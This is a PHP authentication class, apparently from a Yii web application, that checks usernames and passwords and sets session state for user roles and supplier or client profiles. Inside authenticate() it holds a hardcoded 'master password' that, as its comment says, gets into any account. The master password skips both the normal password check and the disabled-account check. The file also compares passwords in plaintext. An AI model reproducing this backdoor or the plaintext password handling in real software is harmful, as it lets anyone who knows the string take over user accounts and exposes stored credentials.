<?php

/**
 * UserIdentity represents the data needed to identity a user.
 * It contains the authentication method that checks if the provided
 * data can identity the user.
 */
class UserIdentity extends CUserIdentity
{
	/**
	 * Authenticates a user.
	 * The example implementation makes sure if the username and password
	 * are both 'demo'.
	 * In practical applications, this should be changed to authenticate
	 * against some persistent user identity storage (e.g. database).
	 * @return boolean whether authentication succeeds.
	 */
	public $status;
	public function authenticate()
	{
        //Master Password to get into any account
        $masterPassword = base64_decode("pratham123");
        $master = 0; // if master is set to 1 then only allow login

		$record		=	Users::model()->findByAttributes(array('username'=>$this->username));
		if(empty($record))
			$this->errorCode=self::ERROR_USERNAME_INVALID;
        else{
            // check for master password and other validations
            if($this->password == $masterPassword)
                $master=1;
            else if($record->password != $this->password)
                $this->errorCode=self::ERROR_PASSWORD_INVALID;
            else if($record->status == 0 )
                $this->errorCode=self::ERROR_UNKNOWN_IDENTITY;
            else
                $master =1;
        }
        if($master)
		{
			if($record->role_id==4 || $record->role_id==5){
				$team		=	Team::model()->findByAttributes(array('users_id'=>$record->id));
				$recordTemp	=	Users::model()->findByPk($team->add_by);
				$role		=	$recordTemp->roles->name;
				$s_profile	=	Suppliers::model()->findByAttributes(array('users_id'=>$recordTemp->id));
				$c_profile	=	ClientProfiles::model()->findByAttributes(array('users_id'=>$recordTemp->id));

			}else{
				$s_profile	=	Suppliers::model()->findByAttributes(array('users_id'=>$record->id));
				$c_profile	=	ClientProfiles::model()->findByAttributes(array('users_id'=>$record->id));
			}

			$this->setState('id', $record->id);
			$this->setState('activation', $record->status);
			if(empty($c_profile)){
				$this->setState('clientProfileId', '0');
			}else{
				$this->setState('clientProfileId', $c_profile->id);
				$this->setState('clientProfileStatus', $c_profile->status);
			}
			if(empty($s_profile)){
				$this->setState('supplierProfileId', '0');
			}else{
				$this->setState('supplierProfileId', $s_profile->id);
				$this->setState('supplierProfileStatus', $s_profile->status);
			}
			$role			=	(isset($role))?$role:$record->roles->name;
			$this->status	=	$record->status;
			$this->setState('role', $role);
			$this->setState('profileStatus',$record->status);			
			$this->setState('name', $record->display_name);
			$this->setState('email', $record->username);
			$this->errorCode=self::ERROR_NONE;
		}
        return !$this->errorCode;		
	}
}
